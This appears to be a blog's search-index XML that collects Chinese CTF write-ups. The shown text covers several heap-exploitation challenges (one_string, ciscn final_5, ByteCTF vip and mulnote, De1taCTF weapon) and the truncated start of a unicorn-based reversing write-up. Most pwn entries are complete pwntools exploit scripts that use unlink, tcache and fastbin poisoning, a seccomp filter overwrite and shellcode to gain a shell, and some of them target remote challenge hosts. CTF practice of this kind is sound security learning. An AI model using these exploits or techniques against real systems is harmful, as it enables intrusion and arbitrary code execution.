<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[中关村2019]one_string</title>
      <link href="/2019/09/24/%E4%B8%AD%E5%85%B3%E6%9D%912019-one-string/"/>
      <url>/2019/09/24/%E4%B8%AD%E5%85%B3%E6%9D%912019-one-string/</url>
      
        <content type="html"><![CDATA[<p>buuoj上面做的</p><a id="more"></a><p>edit的时候，会重新记录size，这个size使用strlen计算。</p><p>如果申请一个可以复用下一个chunk的presize段的chunk，然后使用edit填充满，这样再下一次edit时使用的size就可以覆盖掉下一个chunk的size。</p><p>然后构造unlink，就可以任意写。</p><p>可是不知道咋控制程序执行流，甚至想在<code>malloc_hook上</code>写bss段地址，然后在bss段地址上写shellcode来执行，然后不知道哪里出了问题没啥卵用。</p><p>最终<a href="https://wulidecade.cn/2019/08/16/中关村第三届新兴领域专题赛WP/" target="_blank" rel="noopener">参考了Decade表哥的wp</a>，修改<code>.fini_array</code>来控制程序执行流。</p><p><code>.fini_array</code>数组，里面保存着程序执行完之后执行的函数，这里的思路是可以覆盖<code>.fini_array</code>数组的内容来控制程序执行流程。有一点需要注意的是<code>.fini_array</code>数组里保存的函数是逆序执行的，也就是说会先执行<code>.fini_array[1]</code>再执行<code>.fini_array[0]</code>。例如可以将<code>.fini_array[1]</code>的值改为main函数的地址，将<code>.fini_array[0]</code>改成调用控制<code>.fini_array</code>的函数0x402960，这样执行完main之后就执行又继续执行调用main函数的函数。这样就可以形成循环一直任意地址覆盖写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *from LibcSearcher import *sh=process(&quot;./pwn-2.dms&quot;)#sh=remote(&quot;node2.buuoj.cn.wetolink.com&quot;,28568)sh.recvuntil(&quot;input:\n&quot;)def add(index,content):sh.sendline(&quot;1&quot;)sh.sendline(str(int(index)))sh.sendline(content)def delete(index):sh.sendline(&quot;2&quot;)sh.sendline(str(int(index)))def edit(index,content):sh.sendline(&quot;3&quot;)sh.sendline(str(int(index)))sh.sendline(content)size=0x080EBA00ptr=0x80eba40+12shellcode  = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;add(0x20,&apos;\xff&apos;)#0add(0x18,&apos;\xff&apos;)#1add(0x18,&apos;\xff&apos;)#2add(0x64,p32(0)+p32(0x60)+p32(0xffffffff)*24)#3add(0x60,&apos;\xff&apos;)#4add(0x18,&apos;\xff&apos;)#5edit(3,p32(0xffffffff)*25)edit(3,p32(0xffffffff)+p32(0x61)+p32(ptr-12)+p32(ptr-8)+p32(0xffffffff)*20+p32(0x60)+p32(0x68))delete(4)edit(3,p32(0x80e9f74))edit(0,p32(0)+p32(0x80e9f7c)+shellcode+&apos;\x00&apos;)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_final_5</title>
      <link href="/2019/09/23/ciscn-2019-final-5/"/>
      <url>/2019/09/23/ciscn-2019-final-5/</url>
      
        <content type="html"><![CDATA[<p>还是国赛时的题<br><a id="more"></a></p><p>最关键的点是，在new一个index为16的chunk时，返回的指针指向的其实是head+0x20的地方，所以可以通过在此处伪造一个head，然后free再申请，构造堆重叠。</p><p>然后修改tcache的fd，想怎么打怎么打。</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#sh=process(&quot;./ciscn_final_5.dms&quot;)</span><br><span class="line">libc=ELF(&quot;libc.so.6&quot;)</span><br><span class="line">sh=remote(&quot;pwn.buuoj.cn&quot;,20234)</span><br><span class="line">def new(index,size,content):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">sh.sendline(str(int(index)))</span><br><span class="line">sh.recvuntil(&quot;size: &quot;)</span><br><span class="line">sh.sendline(str(int(size)))</span><br><span class="line">sh.recvuntil(&quot;content: &quot;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def delete(index):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line">sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">sh.sendline(str(int(index)))</span><br><span class="line">def edit(index,content):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">sh.sendline(str(int(index)))</span><br><span class="line">sh.recvuntil(&quot;content: &quot;)</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line">free_got=0x602018</span><br><span class="line">puts_plt=0x400790</span><br><span class="line">puts_got=0x602020</span><br><span class="line">atoi_got=0x602078</span><br><span class="line"></span><br><span class="line">new(16,0x10,p64(0)+p64(0x90))</span><br><span class="line">new(1,0xc0,&apos;1&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">new(2,0x80,p64(0)+p64(0x21)+p64(0x6020E0))</span><br><span class="line">new(3,0xc0,&apos;3&apos;)</span><br><span class="line">new(4,0xc0,p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)+p64(0)*17+p32(0x10)*8)#get ptr</span><br><span class="line">edit(8,p64(puts_plt)*2)</span><br><span class="line">delete(1)</span><br><span class="line">leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)</span><br><span class="line">libcbase=leak-libc.symbols[&apos;puts&apos;]</span><br><span class="line">log.success(&quot;libcbase: &quot;+hex(libcbase))</span><br><span class="line">edit(4,p64(libcbase+libc.symbols[&apos;system&apos;])*2)</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BYTECTF2019-vip</title>
      <link href="/2019/09/12/BYTECTF2019-vip/"/>
      <url>/2019/09/12/BYTECTF2019-vip/</url>
      
        <content type="html"><![CDATA[<p>prctl</p><a id="more"></a><p>比赛时没做出来，因为不知道怎样才能正常使用edit。人人人师傅教了我用<code>seccomp-tools</code>可以看prctl的过滤规则，然而知道过滤规则后依旧不知道咋写2333tcl</p><p>赛后看了很多师傅的wp，其实方法还是还是蛮多的。尤其是看了ROIS战队师傅的wp之后醍醐灌顶，感觉瞬间就会做了233。</p><p>edit函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( dword_4040E0 )</span><br><span class="line">    return read(0, a1, a2);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  if ( fd == -1 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return read(fd, a1, a2);</span><br></pre></td></tr></table></figure><p>prctl规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x06 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009 0008: 0x06 0x00 0x00 0x00050005  return ERRNO(5) 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>在become vip时，让我们输入的name存在溢出的，可以通过溢出来修改prctl规则。</p><p>修改prctl规则，使得<code>open(&quot;/dev/urandom&quot;, 0)</code>的返回值为0，这样就可以正常使用edit了。</p><p>修改后的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000000  A = sys_number 0001: 0x15 0x00 0x03 0x00000101  if (A != openat) goto 0005 0002: 0x20 0x00 0x00 0x00000018  A = filename # openat(dfd, filename, flags, mode) 0003: 0x15 0x00 0x01 0x0040207e  if (A != 0x40207e) goto 0005 0004: 0x06 0x00 0x00 0x00050000  return ERRNO(0) 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>之后利用tcache分配一块chunk到404100，就可以为所欲为。</p><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">onegadget=[0x4f2c5,0x4f322,0x10a38c]</span><br><span class="line">def alloc(idx):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;4&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">sh.sendline(str(int(size)))</span><br><span class="line">sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def vip(name):</span><br><span class="line">sh.recvuntil(&quot;choice: &quot;)</span><br><span class="line">sh.sendline(&quot;6&quot;)</span><br><span class="line">sh.recvuntil(&quot;name: \n&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh=process(&quot;./vip&quot;)</span><br><span class="line">elf=ELF(&apos;./vip&apos;)</span><br><span class="line">libc=ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line">alloc(0)</span><br><span class="line">alloc(1)</span><br><span class="line">vip(&apos;4&apos;*0x20 + &quot;\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f&quot;)</span><br><span class="line">free(1)</span><br><span class="line">edit(0,0x68,&apos;\x00&apos;*0x50+p64(0)+p64(0x61)+p64(0x404100))</span><br><span class="line">alloc(1)</span><br><span class="line">alloc(2)  #404100</span><br><span class="line">edit(2,0x8,p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">show(0)</span><br><span class="line">leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)</span><br><span class="line">log.success(&apos;puts: &apos;+hex(leak))</span><br><span class="line">libcbase=leak-libc.symbols[&apos;puts&apos;]</span><br><span class="line">log.success(&apos;libcbase: &apos;+hex(libcbase))</span><br><span class="line">freehook=libcbase+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line">log.success(&apos;freehook: &apos;+hex(freehook))</span><br><span class="line">edit(2,0x8,p64(freehook))</span><br><span class="line">edit(0,0x8,p64(libcbase+onegadget[1]))</span><br><span class="line">free(0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>De1taCTF2019-weapon</title>
      <link href="/2019/09/11/De1taCTF2019-weapon/"/>
      <url>/2019/09/11/De1taCTF2019-weapon/</url>
      
        <content type="html"><![CDATA[<p>届到了.jpg</p><a id="more"></a><p>虽然还是一知半解，但是至少知道了利用stdout leak的方法，掌握了一种无输出函数的leak方法。</p><p>同时还学到了利用scanf读入大量字符时，会申请一个0x400堆块，把已有的fastbin置入smallbin的操作，这样就可以在限制了分配大小的情况下leaklibc了。</p><p>leaklibc    -&gt;    fastbin attack    -&gt;    get shell</p><p>EXP （不知道为啥leak之后输出就变的和包函数时不一样了只能手动写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#context.log_level=&apos;debug&apos;onegadget=[0x45216,0x4526a,0xf02a4,0xf1147] #libc.so.6def create(size,idx,content):sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;weapon: &quot;)sh.sendline(str(int(size)))sh.recvuntil(&quot;index: &quot;)sh.sendline(str(idx))sh.recvuntil(&quot;input your name:\n&quot;)sh.send(content)def rename(idx,content):sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;3&quot;)sh.recvuntil(&quot;idx: &quot;)sh.sendline(str(int(idx)))sh.recvuntil(&quot;content:\n&quot;)sh.send(content)def delete(idx):sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;2&quot;)sh.recvuntil(&quot;idx :&quot;)sh.sendline(str(idx))libc=ELF(&apos;./pwn&apos;).libcwhile True:sh=process(&apos;./pwn&apos;)create(0x60,0,&quot;a&quot;)create(0x60,1,&quot;a&quot;)create(0x60,2,&quot;a&quot;)delete(0)delete(1)sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;1&quot;*0x400)create(0x60,3,&quot;\xdd\x25&quot;)create(0x60,4,&apos;d&apos;)delete(2)delete(1)rename(1,&apos;\x00&apos;)create(0x60,5,&apos;a&apos;)create(0x60,6,&apos;a&apos;)try:create(0x60,7,&apos;\x00&apos;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x08&apos;)except EOFError:sh.close()continue else:sh.recvuntil(p64(0xfbad1800)+&apos;\x00&apos;*24)leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)mallochook=0x7f20568e1b10+leak-0x7f20568e2608log.success(&quot;malloc_hook: &quot;+hex(mallochook))libcbase=mallochook-libc.symbols[&apos;__malloc_hook&apos;]log.success(&quot;libcbase: &quot;+hex(libcbase))sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;weapon: &quot;)sh.sendline(str(int(0x60)))sh.recvuntil(&quot;index: &quot;)sh.sendline(str(7))sh.recvuntil(&quot;input your name:&quot;)sh.send(&quot;content&quot;)delete(7)sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;3&quot;)sh.recvuntil(&quot;idx: &quot;)sh.sendline(str(int(7)))sh.recvuntil(&quot;content:&quot;)sh.send(p64(mallochook-0x23))sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;weapon: &quot;)sh.sendline(str(int(0x60)))sh.recvuntil(&quot;index: &quot;)sh.sendline(str(8))sh.recvuntil(&quot;input your name:&quot;)sh.send(&quot;content&quot;)sh.recvuntil(&quot;choice &gt;&gt; &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;weapon: &quot;)sh.sendline(str(int(0x60)))sh.recvuntil(&quot;index: &quot;)sh.sendline(str(9))sh.recvuntil(&quot;input your name:&quot;)sh.send(&apos;\x00&apos;*19+p64(libcbase+onegadget[3]))delete(0)delete(0)sh.interactive()break</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BYTECTF2019-mulnote</title>
      <link href="/2019/09/09/BYTECTF2019-mulnote/"/>
      <url>/2019/09/09/BYTECTF2019-mulnote/</url>
      
        <content type="html"><![CDATA[<p>算是第一次在比赛时间里解出堆题？2333菜鸡只能做签到题了</p><a id="more"></a><p>感觉主要难点就是控制流平坦化吧，但是note的写法比较固定了，稍微猜一猜就猜出了程序的逻辑。</p><p>unsorted bin leak出libc地址，然后double free拿malloc_hook，经常看见这样的题目。</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">def Create(size,content):</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;C&quot;)</span><br><span class="line">sh.recvuntil(&quot;size&gt;&quot;)</span><br><span class="line">sh.sendline(str(int(size)))</span><br><span class="line">sh.recvuntil(&quot;note&gt;&quot;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def Edit(index,content):</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;E&quot;)</span><br><span class="line">sh.recvuntil(&quot;index&gt;&quot;)</span><br><span class="line">sh.sendline(index)</span><br><span class="line">sh.recvuntil(&quot;note&gt;&quot;)</span><br><span class="line">sh.send(content)</span><br><span class="line">def Remove(index):</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;R&quot;)</span><br><span class="line">sh.recvuntil(&quot;index&gt;&quot;)</span><br><span class="line">sh.sendline(index)</span><br><span class="line">def Show():</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;S&quot;)</span><br><span class="line">def XB(index,size):</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.send(&quot;XxXxBbBb&quot;)</span><br><span class="line">sh.recvuntil(&quot;index&quot;)</span><br><span class="line">sh.sendline(index)</span><br><span class="line">sh.recvuntil(&quot;new size&gt;size&gt;&quot;)</span><br><span class="line">sh.sendline(str(int(size)))</span><br><span class="line"></span><br><span class="line">#sh=process(&quot;./mulnote&quot;)</span><br><span class="line">sh=remote(&quot;112.126.101.96&quot;,9999)</span><br><span class="line">Create(0x80,&quot;1&quot;)</span><br><span class="line">Create(16,&apos;2&apos;)</span><br><span class="line">Remove(&quot;0&quot;)</span><br><span class="line">Show()</span><br><span class="line">sh.recvuntil(&quot;note[0]:\n&quot;)</span><br><span class="line">leak=u64(sh.recv(6)+&apos;\x00\x00&apos;)</span><br><span class="line">malloc_hook=leak-88-0x10</span><br><span class="line">libcbase=leak-88-0x3C4B20</span><br><span class="line">log.success(&quot;malloc_hook: &quot;+hex(leak-88-0x10))</span><br><span class="line">Create(0x60,&apos;\x11&apos;)</span><br><span class="line">Create(0x60,&apos;\x22&apos;)</span><br><span class="line">Remove(&quot;2&quot;)</span><br><span class="line">Remove(&quot;3&quot;)</span><br><span class="line">Remove(&quot;2&quot;)</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,p64(malloc_hook-0x23))</span><br><span class="line">Create(0x60,&apos;\x00&apos;*19+p64(libcbase+onegadget[1]))</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(&quot;C&quot;)</span><br><span class="line">sh.recvuntil(&quot;size&gt;&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-babyunic</title>
      <link href="/2019/08/19/SUCTF2019-babyunic/"/>
      <url>/2019/08/19/SUCTF2019-babyunic/</url>
      
        <content type="html"><![CDATA[<p>yxtql<br><a id="more"></a></p><p>main函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 2 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;SUCTF 2019&quot;);</span><br><span class="line">  printf(&quot;input your flag:&quot;, a2);</span><br><span class="line">  s1 = malloc(0x200uLL);</span><br><span class="line">  v4 = malloc(0x200uLL);</span><br><span class="line">  __isoc99_scanf(&quot;%50s&quot;, v4);</span><br><span class="line">  sub_CBA(v4, s1, *(_QWORD *)(v5 + 8));</span><br><span class="line">  if ( !memcmp(s1, &amp;unk_202020, 0xA8uLL) )</span><br><span class="line">    puts(&quot;congratuation!&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;fail!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;no input files&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0LL;</span><br></pre></td></tr></table></figure><p>看上去很简单，跟进关键函数subCBA:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&quot;./func&quot;, &quot;rb&quot;);</span><br><span class="line">ptr = malloc(0x7100uLL);</span><br><span class="line">fread(ptr, 1uLL, 0x7100uLL, stream);</span><br><span class="line">v5 = 0x101FFFC0;</span><br><span class="line">v6 = 0x101FFFC0;</span><br><span class="line">v7 = 0x101FFB00;</span><br><span class="line">v8 = 0x101FFA00;</span><br><span class="line">uc_open(3LL, 0x40000004LL, &amp;v9);</span><br><span class="line">uc_mem_map(v9, 0x400000LL, 0x200000LL, 7LL);</span><br><span class="line">uc_mem_map(v9, 0x10000000LL, 0x200000LL, 7LL);</span><br><span class="line">v3 = strlen(a1);</span><br><span class="line">uc_mem_write(v9, 0x101FFB00LL, a1, v3);</span><br><span class="line">uc_mem_write(v9, 0x400000LL, ptr, 28928LL);</span><br><span class="line">uc_reg_write(v9, 31LL, &amp;v5);</span><br><span class="line">uc_reg_write(v9, 32LL, &amp;v6);</span><br><span class="line">uc_reg_write(v9, 7LL, &amp;v8);</span><br><span class="line">uc_reg_write(v9, 6LL, &amp;v7);</span><br><span class="line">uc_emu_start(v9, 0x400000LL, 4223084LL, 0LL, 0LL);</span><br><span class="line">uc_mem_read(v9, 0x101FFA00LL, a2, 200LL);</span><br><span class="line">uc_close(v9);</span><br><span class="line">return fclose(stream)</span><br></pre></td></tr></table></figure><p>完全看不懂，但是通过万能的google了解到这是unicorn。分配了虚拟内存，并在其中模拟代码的执行，最后读取<code>0x101ffa00</code>的内存来与main函数中的输入作比较。</p><p>其中<code>uc_open(3LL, 0x40000004LL, &amp;v9)</code>代表使用<code>UC_ARCH_MIPS</code>和<code>UC_MODE_32</code>，特别的是<code>0x40000004LL</code>，<code>0x4</code>代表了<code>UC_MODE_32</code>，而<code>0x40000000</code>代表了大端序，所以可以判断func使用的是大端序的MIPS32。</p><p>func:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_0(unsigned int param0, unsigned int param1) &#123;</span><br><span class="line">    unsigned int v0 = param0, v1 = param1;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for(i = 0; *(i + v0) != 0; ++i) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int j = 0; j &lt; i; ++j) &#123;</span><br><span class="line">        unsigned char v2 = *(j + v0);</span><br><span class="line">        unsigned int v3 = ((unsigned int)v2) * &amp;loc_8;</span><br><span class="line">        v3 = ((unsigned int)(((unsigned char)(((unsigned int)v2) &gt;&gt;&gt; 5)))) | ((int)(((unsigned char)v3)));</span><br><span class="line">        *(j + v0) = (unsigned char)(((int)(((unsigned char)v3))) ^ ((int)(((unsigned char)j))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *v1 = ((unsigned int)(*(v0 + 1))) + ((unsigned int)(*(v0 + 2))) + ((unsigned int)(*v0)) - ((unsigned int)(*(v0 + 3))) + ((unsigned int)(*(v0 + &amp;loc_4))) - ((unsigned int)(*(v0 + 5))) - ((unsigned int)(*(v0 + 6))) - ((unsigned int)(*(v0 + 7))) - ((unsigned int)(*(v0 + &amp;loc_8))) + ((unsigned int)(*(v0 + 9))) + ((unsigned 